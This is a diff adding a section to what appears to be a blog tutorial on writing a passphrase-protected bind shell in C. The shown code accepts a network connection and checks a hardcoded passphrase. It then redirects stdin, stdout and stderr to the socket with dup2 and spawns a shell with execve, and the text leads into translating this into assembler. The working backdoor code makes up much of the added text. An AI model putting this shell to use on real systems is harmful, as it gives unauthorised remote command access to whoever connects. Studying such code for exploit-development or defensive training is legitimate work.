@@ -74,6 +74,74 @@ if((listen(svr_sock, 2)) == -1)
 }
 {{</ highlight >}}
 
+Now we have a listening socket, we can accept incoming connections. The passphrase validation is a loop that accepts incoming connections, prompts for and checks the passphrase. 
+
+{{< highlight c >}}
+// Start of authentication loop
+do
+{
+	// Accept a request and spawn a new socket for the connection
+	if((client_sock = accept(svr_sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
+	{
+		perror("Accept: ");
+		exit(-1);	
+	}
+{{</ highlight >}}
+
+This code accepts the connection and retains the newly spawned socket that the remote user is connected to.
+
+We can send a message down the new socket to request the secret passphrase from the connecting user.
+
+{{< highlight c >}}
+	// Request a passphrase
+	send(client_sock, (char*)"Speak Friend and Enter: ", 24, 0);
+	read(client_sock, &in, 10);
+
+	// Validate the passphrase
+	if(strcmp(&in, "password\n") != 0)
+	{
+		// Reject bad passphrase and reset for next connection
+		send(client_sock, (char*)"Goodbye\n", 8, 0);
+		close(client_sock);
+		printf("Auth fail: %s\n", (char*)in);
+		bzero(&in, 10);
+	}
+{{</ highlight >}}
+
+A bad passphrase results in the new socket being closed and the system going back to listening. Input data is limited by the length value in the read call. However, we have to zero out the input buffer after a failed attempt as there many be leftovers on the next pass.
+
+If we get a good passphrase, we can break out of the authenticaton loop.
+
+{{< highlight c >}}
+	else
+	{	
+		// Break out of the loop when passphrase is good 
+		send(client_sock, (char*)"Welcome\n", 8, 0);
+		connected = 1;
+		printf("Auth Passed!\n");
+	}
+}while(connected == 0);
+{{</ highlight >}}
+
+We can now kill the old server socket, clone the I/O streams into the new socket and spawn the shell.
+
+{{< highlight c >}}
+// Kill the server socket
+close(svr_sock);
+
+// Redirect file descriptors to new socket
+dup2(client_sock, 0); // STDIN
+dup2(client_sock, 1); // STDOUT
+dup2(client_sock, 2); // STDERR
+
+// Start a shell
+execve(arguments[0], &arguments[0], NULL);
+{{</ highlight >}}
+
+At this point we're good to go.
+
+### Translating The Code to Assembler
+
 
 
 The sockaddr_in structure is described in netinet/in.h
